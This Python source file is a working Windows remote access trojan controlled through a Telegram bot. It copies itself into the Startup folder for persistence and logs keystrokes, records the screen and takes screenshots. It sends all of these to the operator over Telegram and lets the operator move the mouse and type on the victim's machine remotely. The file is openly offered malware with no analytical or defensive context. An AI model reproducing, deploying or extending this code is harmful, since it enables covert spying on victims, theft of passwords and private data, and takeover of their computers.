from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup
import dxcam
from PIL import Image, ImageDraw
import getpass
import threading
import os
import keyboard
import cv2
import shutil
import sys
import mouse


admin_list = []#список телеграм id начальных администраторов бота
token = ""#токен телеграм бота
bot = Bot(token)
dp = Dispatcher(bot)
keylogging = False
videorec = False
wait = False
alt = False
dir_name = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
shutil.copy(sys.argv[0], dir_name)

def keyLogger(dir):
    global keylogging
    while keylogging:
        key_event = keyboard.read_event()
        if key_event.event_type == "down":
            open(dir, 'a').write(key_event.name + " ")

def videoRec(dir):
    global videorec
    camera = dxcam.create(output_idx=0, output_color="BGR")
    camera.start(target_fps=30, video_mode=True)
    writer = cv2.VideoWriter(dir, cv2.VideoWriter_fourcc(*"mp4v"), 30, (1920, 1080))
    while videorec:
        writer.write(camera.get_latest_frame())
    camera.stop()
    writer.release()

@dp.message_handler(commands=['keyboard'])
async def sendKeyboard(message: types.message):
    if message.chat.id in admin_list:
        keys = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True).row('Screenshot📸').add().row('StartKeyLogging✍️','EndKeyLogging🗒').add().row('StartRec🎥','EndRec🎬')
        await bot.send_message(message.chat.id, '✅', reply_markup=keys)

@dp.message_handler(commands=['start'])
async def sendSimKeyboard(message: types.message):
    if message.chat.id in admin_list:
        await bot.send_message(message.chat.id, '<b>Developed by <b>@kittt_tg</b>\n\n<b>T0 Act1vate Keyb0ard use</b> <em>/keyboard</em>\n\n<b>T0 Act1vate S1mulat10n use</b> <em>/simulation</em>\n\n<b>T0 Destr0y use</b> <em>/destroy</em>', parse_mode='HTML')

@dp.message_handler(commands=['destroy'])
async def destroy(message: types.message):
    if message.chat.id in admin_list:
        await bot.send_message(message.chat.id, 'GenEzz will be destroyed on this PC✅')
        dir_aulo = 'C:\\Users\\'+getpass.getuser()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'+os.path.basename(sys.argv[0])
        try:
            os.remove(dir_aulo)
            await bot.send_message(message.chat.id, "Deleted from autoload module✅")
        except:
            await bot.send_message(message.chat.id, "Can't delete from autoload module❌")
        sys.exit()

@dp.message_handler(commands=['simulation'])
async def sendSimKeyboard(message: types.message):
    if message.chat.id in admin_list:
        keys = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True).row('Screenshot📸').add().row('LeftClick↙️', 'RightClick↘️').add().row('Drag🫳', 'AltTab🗺').add().row('MoveMouse🤭', 'WriteText🖋')
        await bot.send_message(message.chat.id, '✅', reply_markup=keys)

@dp.message_handler(text=['StartKeyLogging✍️', 'EndKeyLogging🗒'])
async def KeyLogging(message: types.message):
    global keylogging
    if message.chat.id in admin_list:
        dir = 'C:\\Users\\' + getpass.getuser() + '\AppData\Roaming\logs.txt'
        if message.text == 'StartKeyLogging✍️' and not keylogging:
            keylogging = True
            await bot.send_message(message.chat.id, 'Start key loging✅')
            daemon_thread = threading.Thread(target=lambda : keyLogger(dir), daemon=True)
            daemon_thread.start()
        elif message.text == 'EndKeyLogging🗒' and keylogging:
            keylogging = False
            await bot.send_message(message.chat.id, 'End key loging✅')
            await bot.send_document(message.chat.id, open(dir, 'rb'))
            os.remove(dir)

@dp.message_handler(text=['StartRec🎥', 'EndRec🎬'])
async def VideoRec(message: types.message):
    global videorec
    if message.chat.id in admin_list:
        dir = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\video.mp4'
        if message.text == 'StartRec🎥' and not videorec:
            videorec = True
            await bot.send_message(message.chat.id, 'Start video rec✅')
            daemon_thread = threading.Thread(target=lambda : videoRec(dir), daemon=True)
            daemon_thread.start()
        elif message.text == 'EndRec🎬' and videorec:
            videorec = False
            await bot.send_message(message.chat.id, 'End video rec✅')
            await bot.send_document(message.chat.id, open(dir, 'rb'))
            os.remove(dir)

@dp.message_handler(text=['Screenshot📸'])
async def screenshot(message: types.message):
    if message.chat.id in admin_list:
        try:
            dir = 'C:\\Users\\' + getpass.getuser() + '\AppData\Roaming\scr.png'
            camera = dxcam.create()
            frame = camera.grab()
            img = Image.fromarray(frame)
            pencil = ImageDraw.Draw(img)
            pencil.rectangle((mouse.get_position()[0]-6, mouse.get_position()[1]-6, mouse.get_position()[0]+6, mouse.get_position()[1]+6), fill ='cyan')
            img.save(dir)
            await bot.send_photo(message.chat.id, open(dir, 'rb'), caption=mouse.get_position())
            os.remove(dir)
        except:
            await bot.send_message(message.chat.id, "Can't create screenshot❌")

@dp.message_handler(commands=['add'])
async def addadmin(message: types.message):
    if message.chat.id in admin_list:
        try:
            user = int(message.text[5:])
            if not user in admin_list:
                admin_list.append(user)
                await bot.send_message(message.chat.id, 'Added new Admin✅')
            else:
                await bot.send_message(message.chat.id, 'Admin already exists❌')
        except:
            await bot.send_message(message.chat.id, 'Invalid user id❌')

@dp.message_handler(commands=['del'])
async def deladmin(message: types.message):
    if message.chat.id in admin_list:
        try:
            user = int(message.text[5:])
            if user in admin_list:
                admin_list.remove(user)
                await bot.send_message(message.chat.id, 'Admin removed✅')
            else:
                await bot.send_message(message.chat.id, 'No admin❌')
        except:
            await bot.send_message(message.chat.id, 'Invalid user id❌')

@dp.message_handler(content_types='text')
async def simulation(message: types.message):
    global wait, alt
    if message.chat.id in admin_list:
        if not wait:
            if 'LeftClick↙️' in message.text:
                mouse.click('left')
            elif 'RightClick↘️' in message.text:
                mouse.click('right')
            elif 'Drag🫳' in message.text:
                wait = 'Drag🫳'
                await bot.send_message(message.chat.id, 'Enter drag x y')
            elif 'MoveMouse🤭' in message.text:
                wait = 'MoveMouse🤭'
                await bot.send_message(message.chat.id, 'Enter move x y')
            elif 'AltTab🗺' in message.text:
                if not alt:
                    alt = True
                    keyboard.press('alt')
                    keyboard.press_and_release('tab')
                else:
                    alt = False
                    keyboard.release('alt')
            elif 'WriteText🖋' in message.text:
                wait = 'WriteText🖋'
                await bot.send_message(message.chat.id, 'Enter text')
        else:
            if wait == 'MoveMouse🤭':
                wait = False
                try:
                    params = str(message.text).split()
                    x = params[0]
                    y = params[1]
                    mouse.move(x,y,absolute=True,duration=0.1)
                    await bot.send_message(message.chat.id, f'Mouse moved to{mouse.get_position()}✅')
                except:
                    await bot.send_message(message.chat.id, "Can't move mouse❌")
            elif wait == 'WriteText🖋':
                wait = False
                try:
                    keyboard.write(message.text, delay=0.1)
                    await bot.send_message(message.chat.id, f'Wrote text✅')
                except:
                    await bot.send_message(message.chat.id, "Can't write text❌")
            elif wait == 'Drag🫳':
                wait = False
                try:
                    params = str(message.text).split()
                    x = params[0]
                    y = params[1]
                    mouse.drag(mouse.get_position()[0], mouse.get_position()[1], x, y, absolute=True, duration=0.1)
                    await bot.send_message(message.chat.id, f'Mouse dragged to{mouse.get_position()}✅')
                except:
                    await bot.send_message(message.chat.id, "Can't drag mouse❌")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)